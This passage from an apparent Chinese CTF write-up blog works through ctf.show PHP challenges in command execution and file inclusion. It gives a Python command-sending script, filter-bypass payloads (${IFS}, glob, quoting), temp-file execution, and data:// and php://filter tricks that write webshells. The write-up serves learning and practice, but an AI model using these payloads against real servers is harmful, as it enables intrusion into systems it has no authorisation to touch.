keyword">if</span> t<span class="token operator">==</span><span class="token string">""</span><span class="token punctuation">:</span>                   <span class="token keyword">break</span>               <span class="token keyword">if</span> t<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">==</span>i<span class="token punctuation">:</span>                   <span class="token comment">#print(i)</span>                   s1<span class="token operator">+=</span>t<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token number">5</span><span class="token punctuation">]</span>                   s2<span class="token operator">+=</span>t<span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token number">9</span><span class="token punctuation">]</span>                   <span class="token keyword">break</span>           f<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>     output<span class="token operator">=</span><span class="token string">"(\""</span><span class="token operator">+</span>s1<span class="token operator">+</span><span class="token string">"\"|\""</span><span class="token operator">+</span>s2<span class="token operator">+</span><span class="token string">"\")"</span>     <span class="token keyword">return</span><span class="token punctuation">(</span>output<span class="token punctuation">)</span>     <span class="token operator">></span><span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>     param<span class="token operator">=</span>action<span class="token punctuation">(</span><span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">"\n[+] your function："</span><span class="token punctuation">)</span> <span class="token punctuation">)</span><span class="token operator">+</span>action<span class="token punctuation">(</span><span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">"[+] your command："</span><span class="token punctuation">)</span><span class="token punctuation">)</span>     data<span class="token operator">=</span><span class="token punctuation">&#123;</span>           <span class="token string">'c'</span><span class="token punctuation">:</span>urllib<span class="token punctuation">.</span>parse<span class="token punctuation">.</span>unquote<span class="token punctuation">(</span>param<span class="token punctuation">)</span>           <span class="token punctuation">&#125;</span>     r<span class="token operator">=</span>requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span>data<span class="token operator">=</span>data<span class="token punctuation">)</span>     <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"\n[*] result:\n"</span><span class="token operator">+</span>r<span class="token punctuation">.</span>text<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>先执行rec.php，然后生成文件后执行exp.py，调用命令然后获取信息</p></blockquote><h3 id="web42"><a href="#web42" class="headerlink" title="web42"></a>web42</h3><p><img src="https://cdn.jsdelivr.net/gh/ntrack/blog_img/img/202308302124027.png"></p><p>题目是设计了LINUX的命令作用，&gt;&#x2F;dev&#x2F;null 2&gt;&amp;1对操作的内容不进行回显</p><blockquote><p>解法一：“ ; ”分隔命令</p><p>查看目录信息：?c&#x3D;ls;1 查看文件内容：?c&#x3D;tac flag.php;1</p><p>解法二：分行处理</p><p>查看目录信息：?c&#x3D;ls%0a查看文件内容：?c&#x3D;tac flag.php%0a&#x2F;&#x2F;%0a的URL解码是换行</p></blockquote><blockquote><p>导出错误区别：</p><p>2&gt;&#x2F;dev&#x2F;null<br>把错误输出到&#x2F;dev&#x2F;null文件中，这个文件会丢弃一切写入其中的数据，类似“黑洞”</p><p>&#x2F;dev&#x2F;null 2&gt;&amp;1<br>默认情况是1，也就是等同于1&gt;&#x2F;dev&#x2F;null 2&gt;&amp;1。意思就是把标准输出<a href="https://so.csdn.net/so/search?q=%E9%87%8D%E5%AE%9A%E5%90%91&spm=1001.2101.3001.7020">重定向</a>到“黑洞”，还把错误输出2重定向到标准输出1，也就是标准输出和错误输出都进了“黑洞”</p><p>2&gt;&amp;1 &gt;&#x2F;dev&#x2F;null<br>意思就是把错误输出2重定向到标准输出1，也就是屏幕，标准输出进了“黑洞”，也就是标准输出进了黑洞，错误输出打印到屏幕</p><p><a href="https://blog.csdn.net/longgeaisisi/article/details/90519690">参考文章</a></p><p>其中0,1,2是文件描述符。0代表标准输入，1代表标准输出，2代表标准错误</p></blockquote><h3 id="web52"><a href="#web52" class="headerlink" title="web52"></a>web52</h3><p><img src="https://cdn.jsdelivr.net/gh/ntrack/blog_img/img/202308302239654.png"></p><p>题目过滤了很多的内容，其中包括了%09(tab)和%26(&amp;)，即无法使用tab来代替空格和&amp;&amp;执行另外命令，同时还过滤了tac等查看文件的命令，同时还设置了flag不在当前目录，而是在根目录的flag文件中</p><blockquote><p>解法：ca’’t+ ${IFS} + %0a(换行)</p><p>查看当前目录：?c&#x3D;ls%0a&#x2F;&#x2F;使用?c&#x3D;ca’’t${IFS}fla?.php%0a查看源码发现只有$flag&#x3D;”flag_here”</p><p>一直查看上一级目录，最后发现了根目录的flag：?c&#x3D;ls${IFS}..&#x2F;..&#x2F;..&#x2F;${IFS}-al%0a</p><p>查看flag内容：?c&#x3D;ca’’t${IFS}..&#x2F;..&#x2F;..&#x2F;fla?%0a</p></blockquote><h3 id="web54"><a href="#web54" class="headerlink" title="web54"></a>web54</h3><p><img src="https://cdn.jsdelivr.net/gh/ntrack/blog_img/img/202309011059621.png"></p><p>过滤的内容十分之多，过滤匹配可能的 “flag” 关键字，但是可以使用?绕过(·匹配任意的字符，而*匹配0次或者多次，但是?匹配任意字符，使用?可以达到绕过这个匹配机制)，然后查看文件内容的命令也过滤了很多，无法使用’’或者\绕过关键字(在关键字中添加’’或者\都被过滤)，但是发现还可以使用uniq命令和rev命令</p><blockquote><p>解法一：uniq命令+f???????</p><p>payload：?c&#x3D;uniq${IFS}f???????     然后查看源码ctrl+u</p><p>解法二：rev命令+f???????</p><p>payload：?c&#x3D;rev${IFS}f???????</p><p>解法三：&#x2F;bin&#x2F;c??+f???????&#x2F;&#x2F;在系统路径下使用cat命令</p><p>payload：?c&#x3D;&#x2F;bin&#x2F;?at${IFS}f???????</p></blockquote><h3 id="web55"><a href="#web55" class="headerlink" title="web55"></a>web55</h3><p><img src="https://cdn.jsdelivr.net/gh/ntrack/blog_img/img/202309031537033.png"></p><p>看到将大小写字母都过滤了，同时还过滤了反引号，无法执行命令，没有新的知识储备完成，这是新的学习内容。（get传入参数+post传文件）</p><blockquote><p>解法：glob通配符 + ” . “执行命令</p><p>通过POST上传文件：</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup">><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">html</span><span class="token punctuation">></span></span>><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span> <span class="token attr-name">lang</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>en<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>UTF-8<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">http-equiv</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>X-UA-Compatible<span class="token punctuation">"</span></span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>IE=edge<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>viewport<span class="token punctuation">"</span></span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>width=device-width, initial-scale=1.0<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span>Document<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span>><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span>><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>http://4739117f-db02-44a8-8059-4a9e9bbe2f31.challenge.ctf.show/<span class="token punctuation">"</span></span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>post<span class="token punctuation">"</span></span> <span class="token attr-name">enctype</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>multipart/form-data<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>label</span> <span class="token attr-name">for</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>file<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>文件名:<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>label</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>file<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>file<span class="token punctuation">"</span></span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>file<span class="token punctuation">"</span></span><span class="token punctuation">></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>提交<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span>><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span>><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>上传文件1.txt：</p><blockquote><p>#!&#x2F;bin&#x2F;bash</p><p>ls</p></blockquote><p>最后传参数: ?c&#x3D;.%20&#x2F;???&#x2F;????????[@-[]</p><p>解释:</p><p>通过post上传文件到靶机地址，上传文件内容为执行命令的内容，然后PHP会将POST上传的文件临时保存在&#x2F;tem的目录下并且命名为php+随机大小写6位数字的形式(&#x2F;tem)，最后再用” . “和通配符执行该上传文件的内容.大小字母的ASCII范围在字符@和[间,所以最后一个字母匹配为大写</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/ntrack/blog_img/img/202309031621482.png"></p><p><a href="https://www.dongchuanmin.com/php/2420.html#:~:text=%E5%90%91%20PHP%20%E5%8F%91%E9%80%81%20Post%20%E6%95%B0%E6%8D%AE%E5%8C%85%EF%BC%8C%E5%A6%82%E6%9E%9C%E6%95%B0%E6%8D%AE%E5%8C%85%E4%B8%AD%E5%8C%85%E5%90%AB%E6%96%87%E4%BB%B6%EF%BC%8C%E6%97%A0%E8%AE%BA%20php%20%E4%BB%A3%E7%A0%81%E4%B8%AD%E6%9C%89%E6%B2%A1%E6%9C%89%E5%A4%84%E7%90%86%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%9A%84%E9%80%BB%E8%BE%91%EF%BC%8Cphp,%E9%83%BD%E4%BC%9A%E5%B0%86%E8%BF%99%E4%B8%AA%E6%96%87%E4%BB%B6%E4%BF%9D%E5%AD%98%E4%B8%BA%E4%B8%80%E4%B8%AA%E4%B8%B4%E6%97%B6%E6%96%87%E4%BB%B6%20%E8%AF%A5%E6%96%87%E4%BB%B6%E9%BB%98%E8%AE%A4%E5%AD%98%E5%82%A8%E5%9C%A8%20%2Ftmp%20%E7%9B%AE%E5%BD%95%E4%B8%AD%E3%80%8E%E5%8F%AF%E9%80%9A%E8%BF%87%20php.ini%20%E7%9A%84%20upload_tmp_dir%20%E6%8C%87%E5%AE%9A%E5%AD%98%E5%82%A8%E4%BD%8D%E7%BD%AE%E3%80%8F">PHP上传的临时位置</a></p><p><a href="http://c.biancheng.net/c/ascii/">ASCII码表</a></p><p><a href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html">参考资料</a></p><h3 id="web68"><a href="#web68" class="headerlink" title="web68"></a>web68</h3><p><img src="https://cdn.jsdelivr.net/gh/ntrack/blog_img/img/202309032121484.png"></p><p>很有意思,一看就是highlight_file()函数被禁了,然后只能根据之前的内容猜测是post传参数c,尝试后确实如此.想要使用c&#x3D;print_r(glob(“*”));查看当前目录信息,发现print_r()函数被禁止使用,然后使用var_dump()代替,发现目录下有flag.php,然后使用之前学到查看文件内容的函数,发现几乎都被禁用了,无法继续.最后弄了一阵子,无法解决看了wp.发现可以使用include来查看文件的非程序内容,但是无法查看flag.php的内容,因为其中内容被视作php代码执行了,被注释,最后看到了readgzfile函数()[<strong>读取文件，解压缩并将其写入标准输出</strong>]可以查看文件的内容,发现文件不在当前目录下<img src="https://cdn.jsdelivr.net/gh/ntrack/blog_img/img/202309032129311.png">,于是使用c&#x3D;var_dump(scandir(“..&#x2F;..&#x2F;..&#x2F;“));不断查看上一级的目录信息,发现在..&#x2F;..&#x2F;..&#x2F;目录下存在flag.txt</p><blockquote><p>解法:</p><p>c&#x3D;readgzfile(“..&#x2F;..&#x2F;..&#x2F;flag.txt”);</p><p>c&#x3D;include(“..&#x2F;..&#x2F;..&#x2F;flag.txt”);</p></blockquote><h3 id="web69"><a href="#web69" class="headerlink" title="web69"></a>web69</h3><p>题目和web68差不多,不过当我想要输出的时候,发现了var_dump和print_r都被禁用了,当想使用echo的时候,发现echo无法打印数组,于是查询了一下资料,发现json_encode可以将数组转换成json的字符串形式,implode也可以将数组转换成字符串的形式,最后使用其中一种做完题目</p><blockquote><p>解法:</p><p>查看目录: c&#x3D;echo json_encode(scandir(“.”));</p><p>查看文件: c&#x3D;readgzfile(“flag.php”);</p><p>继续查看目录: c&#x3D;echo json_encode(scandir(“..&#x2F;..&#x2F;..&#x2F;“));</p><p>查看flag: c&#x3D;readgzfile(“..&#x2F;..&#x2F;..&#x2F;flag.txt”);</p></blockquote><p>implode(separator,array) : separator是可选连接数组的字符</p><p>json_encode (array) : 将数组转为JSON格式的字符串</p><h3 id="web71"><a href="#web71" class="headerlink" title="web71"></a>web71</h3><p><img src="https://cdn.jsdelivr.net/gh/ntrack/blog_img/img/202309032331418.png"></p><p>代码审计后发现ob_get_contents(版本php4、5)是返回输出缓冲区的内容，大概作用是将执行命令的输出内容存储在$s中，然后用ob_end_clean清空缓存不直接输出命令执行结果的内容，并用将命令执行结果内容的大小写字母和数字内容更改成“ ? ”输出，达到无法看清命令执行结果的内容。</p><blockquote><p>解法一：提前结束程序运行</p><p>使用die()或者exit(0)结束程序</p><p>查看目录：c&#x3D;echo json_encode(scandir(“.”));die();</p><p>查看flag：c&#x3D;readgzfile(“..&#x2F;..&#x2F;..&#x2F;flag.txt”);exit(0);</p><p>解法二：提前将缓存内容送到浏览器</p><p>ob_flush()【不会销毁缓冲区】和ob_end_flush()【会销毁缓冲区】将缓存内容送到浏览器并释放</p><p>查看目录：c&#x3D;echo json_encode(scandir(“.”));ob_flush();</p><p>查看flag：c&#x3D;readgzfile(“..&#x2F;..&#x2F;..&#x2F;flag.txt”);ob_end_flush();</p></blockquote><h2 id="命令执行总结一波"><a href="#命令执行总结一波" class="headerlink" title="命令执行总结一波"></a>命令执行总结一波</h2><p><strong>1.PHP中使用系统命令需要使用到system或者passthru函数,eval是代码执行</strong></p><p><strong>2.PHP中include函数是可以不使用()的</strong></p><p><strong>3.cat和tac在php中查看信息的区别是cat是顺序查看php代码，按照&lt;?php格式执行代码，无法显示注释信息在页面，而tac逆序查看，没有这种格式顺序</strong></p><p><strong>4.nginx在linux的默认路径&#x2F;var&#x2F;log&#x2F;nginx&#x2F;access.log</strong></p><p><strong>5.%0a的url解码是换行，%09是tab的作用</strong></p><p><strong>6.使用&amp;&amp;需要传入%26%26</strong></p><p><strong>7.Linux一般查看文件命令</strong></p><blockquote><p>cat：连接文件并打印到标准输出设备上</p><p>tac：将文件全部内容从尾到头反向连续输出到标准输出(屏幕)上</p><p>less： 可以随意浏览文件，支持翻页和搜索，支持向上翻页和向下翻页</p><p>head：查看文件前几行内容，默认10行</p><p>tail：head相对</p><p>uniq：检查及删除文本文件中重复出现的行列</p><p>sort：将文本文件内容加以排序输出</p><p>od：读取所给予的文件的内容，并将其内容以八进制字码呈现出来</p><p>nl：显示文件对应行数的内容和字符数</p><p>rev：将文件里面按字节逆序输出</p></blockquote><p><strong>8.正则表达式匹配</strong></p><blockquote><p>.：匹配任何字符，除了换行符。<br>\d：匹配任何数字字符，相当于 [0-9]。<br>\D：匹配任何非数字字符，相当于 [^0-9]。<br>\w：匹配任何字母、数字或下划线字符，相当于 [a-zA-Z0-9_]。<br>\W：匹配任何非字母、数字或下划线字符，相当于 [^a-zA-Z0-9_]。<br>\s：匹配任何空白字符，包括空格、制表符和换行符。<br>\S：匹配任何非空白字符。<br>\b：匹配单词边界，用于确保匹配的内容是一个完整的单词。<br>\B：匹配非单词边界。<br>^：匹配字符串的开始。<br>$：匹配字符串的结束。<br>[abc]：匹配字符集中的任何一个字符，例如 [aeiou] 匹配任何一个元音字母。<br>[^abc]：匹配不在字符集中的任何字符。<br>a|b：匹配 a 或 b。<br>(abc)：创建一个捕获组，可以在后续的正则表达式中引用。</p></blockquote><p><strong>9.PHP执行查看文件内容函数</strong></p><blockquote><p>file_get_contents </p><p>fread</p><p>fgets</p><p>fgetss</p><p>file<br>parse_ini_file</p><p>readfile </p><p>highlight_file</p><p>show_source</p><p>include</p><p>require</p><p>fpassthru</p><p>readgzfile</p></blockquote><p><strong>10.<a href="https://segmentfault.com/a/1190000018991087">PHP伪协议</a></strong></p><h3 id="web79"><a href="#web79" class="headerlink" title="web79"></a>web79</h3><p><img src="https://cdn.jsdelivr.net/gh/ntrack/blog_img/img/202309091002981.png"></p><p>发现将php进行了过滤，即没有办法使用php的语句，如果flag在flag.php也无法直接查看使用，或者是php:&#x2F;&#x2F;伪协议，使用file:&#x2F;&#x2F;协议也需要使用 到php后缀，但是发现data:&#x2F;&#x2F;协议可以进行数据处理。</p><blockquote><p>解法一：data:&#x2F;&#x2F;协议+短标签</p><p>payload：?file&#x3D;data:&#x2F;&#x2F;text&#x2F;plain,<?= system("ls");?>&#x2F;&#x2F;替换ls为tac flag*</p><p>解法二：data:&#x2F;&#x2F;协议的转码</p><p>payload：?file&#x3D;data:&#x2F;&#x2F;text&#x2F;plain;base64,PD9waHAgc3lzdGVtKCJscyIpOyA&#x2F;Pg&#x3D;&#x3D;&#x3D;&gt;<?php system("ls");?></p><p>查看flag.php：?file&#x3D;data:&#x2F;&#x2F;text&#x2F;plain;base64,PD9waHAgc3lzdGVtKCJ0YWMgZmxhZy5waHAiKTsgPz4&#x3D;  &#x3D;&gt;  <?php system("tac falg.php");?></p></blockquote><h3 id="web82"><a href="#web82" class="headerlink" title="web82"></a>web82</h3><p><img src="https://cdn.jsdelivr.net/gh/ntrack/blog_img/img/202309091028307.png"></p><p>过滤的信息造成了对现在而言很大的难度，因为禁用php、data和“ ： ”就禁用了大部分可查看数据的伪协议，然后我想过post上传文件，在docker中的默认地方查看和执行文件的bash命令，但是发现把” . “禁用了，再后来发现这不是命令执行了，无法执行命令内容了，而且文件包含的路径需要完整路径，最后弄了一通，看wp。</p><blockquote></blockquote><h3 id="web87"><a href="#web87" class="headerlink" title="web87"></a>web87</h3><p><img src="https://cdn.jsdelivr.net/gh/ntrack/blog_img/img/202309091057210.png"></p><p>发现对传入的file进行了过滤还进行了一次url解码，即想让我们无法完成文件的访问，同时还对传入的内容前连接上了die操作，即无法执行对应的传入内容，让它提前结束。想用php伪协议进行操作，可是发现无从下手，看wp后学到了一波知识 （操作就是用利用file_put_contents写入新文件内容，然后在访问新文件执行命令获取信息）</p><blockquote><p>解法一：使用php:&#x2F;&#x2F;filter协议的base64解码</p><p><strong>base64编码</strong></p><p>下面有base64编码的介绍内容，大概就是base64编码会将字符串由4个字符通过规律变成4个字符，解码会将4个字符变成3个字符（需连续的字符，中间空格不影响），而字符的组成有大小写字母和数字还有” &#x3D; “号，除了这些外，其他的解码内容视为跳过。</p><p>conten输入：</p><p>aaPD9waHAgc3lzdGVtKCJscyIpOyA&#x2F;Pg&#x3D;&#x3D;    &#x2F;&#x2F;除了aa外的解码内容是：&lt;?php system(“ls”); ?&gt;</p><p>解释：因为题目对post的content的内容连接了一些提前结束的内容，所以需要绕过这些内容，那么最好的方法就是将其分解成php无法识别的代码，所以通过base64编码进行绕过，通过base64的简单了解，发现相连的字母<strong>php die</strong>(6字符)可以将其凑成8个字符，让其解码成php无法认识的信息，就添加了两个字符的aa</p><p>file输入：</p><px2F;&#x2F;这一串是php:&#x2F;&#x2F;filter&#x2F;write&#x3D;convert.base64-decode&#x2F;resource&#x3D;flag.php的两个URL全编码</p><p>解释：因为发送参数的时候服务器会对url进行解码一次，然后接受参数后，题目要求再对file进行一次解码，所以需要两次url全编码，也绕过了php和” : “的过滤</p><p>最后访问flag.php文件就可以执行ls的命令了，其他的只需要修改ls内容并编码传入即可</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token operator">></span><span class="token variable">$filename</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"f"</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token operator">></span><span class="token variable">$content</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token operator">></span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$content</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'&lt;?php exit(); ?>'</span><span class="token operator">.</span><span class="token variable">$content</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">></span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">></span><span class="token punctuation">&#125;</span><span class="token operator">></span><span class="token comment">//测试内容:</span><span class="token operator">></span><span class="token comment">/* >f=php://filter/convert.base64-decode/resource=1.php >c=aPD9waHAgcGhwaW5mbygpOyA/Pg==//将php exit加个a配成8字符>*/</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><a href="https://ntrack.github.io/2023/05/28/base64%E7%BC%96%E7%A0%81/">base64编码介绍</a></p></blockquote><blockquote><p>解法二：使用伪协议组合拳string.strip_tags和base64解码 </p><p>看到&lt;?php  die(“…”);?&gt;其实是含有php标签的内容，而string.strip_tags可以剥去字符串中的 HTML、XML 以及 PHP 的标签，使内容变成die(“…”);无法执行，而再对后面输入的内容进行base64编码成需要执行的内容传入文件中【传入了payload后，因为存在string.strip_tags所以会对相关的标签进行消除，即原来存在的连接内容，但是因为payload是base64编码形式的内容，所以没有办法消除这个信息，再通过编码将编码后的执行内容输入到新文件中】</p><p>conten输入：</p><p>PD9waHAgc3lzdGVtKCJscyIpOyA&#x2F;Pg&#x3D;&#x3D;</p><p>file输入：</p><p>%25%37%30%25%36%38%25%37%30%25%33%61%25%32%66%25%32%66%25%36%36%25%36%39%25%36%63%25%37%34%25%36%35%25%37%32%25%32%66%25%37%33%25%37%34%25%37%32%25%36%39%25%36%65%25%36%37%25%32%65%25%37%33%25%37%34%25%37%32%25%36%39%25%37%30%25%35%66%25%37%34%25%36%31%25%36%37%25%37%33%25%37%63%25%36%33%25%36%66%25%36%65%25%37%36%25%36%35%25%37%32%25%37%34%25%32%65%25%36%32%25%36%31%25%37%33%25%36%35%25%33%36%25%33%34%25%32%64%25%36%34%25%36%35%25%36%33%25%36%66%25%36%34%25%36%35%25%32%66%25%37%32%25%36%35%25%37%33%25%36%66%25%37%35%25%37%32%25%36%33%25%36%35%25%33%64%25%36%36%25%36%63%25%36%31%25%36%37%25%32%65%25%37%30%25%36%38%25%37%30</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token operator">></span><span class="token variable">$filename</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"f"</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token operator">></span><span class="token variable">$content</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token operator">></span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$content</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>@<span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'&lt;?php exit(); ?>'</span><span class="token operator">.</span><span class="token variable">$content</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">></span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">></span><span class="token punctuation">&#125;</span><span class="token operator">></span><span class="token comment">//测试内容:</span><span class="token operator">></span><span class="token comment">/* >f=php://filter/string.strip_tags|convert.base64-decode/resource=1.php>c=PD9waHAgc3lzdGVtKCJscyIpOyA/Pg==>*/</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><a href="https://www.runoob.com/php/func-string-strip-tags.html">string.strip_tags介绍</a></p></blockquote><blockquote><p>解法三：使用php:&#x2F;&#x2F;filter&#x2F;string.rot13和短标签关闭【如果没有关闭会失效】</p><p>rot13是回转13位编码，即字母位回转移位13。同时php的短标签在Linux是默认关闭，而在Windows是默认开启的</p><p>利用php:&#x2F;&#x2F;filter&#x2F;string.rot13对传入文件的内容进行解码，使得php无法识别被解码后的&lt;?php exit();?&gt;，然后获得解码后的webshell</p><p><a href="http://www.hiencode.com/rot13.html">rot13编码工具</a></p><p><img src="https://cdn.jsdelivr.net/gh/ntrack/blog_img/img/202309091641869.png"></p><pre class="line-numbers language-php" data-language="php"><code class="language-php">><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token operator">></span><span class="token variable">$filename</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"f"</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token operator">></span><span class="token variable">$content</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token operator">></span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$content</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>@<span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'&lt;?php exit(); ?>'</span><span class="token operator">.</span><span class="token variable">$content</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">></span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">></span><span class="token punctuation">&#125;</span><span class="token 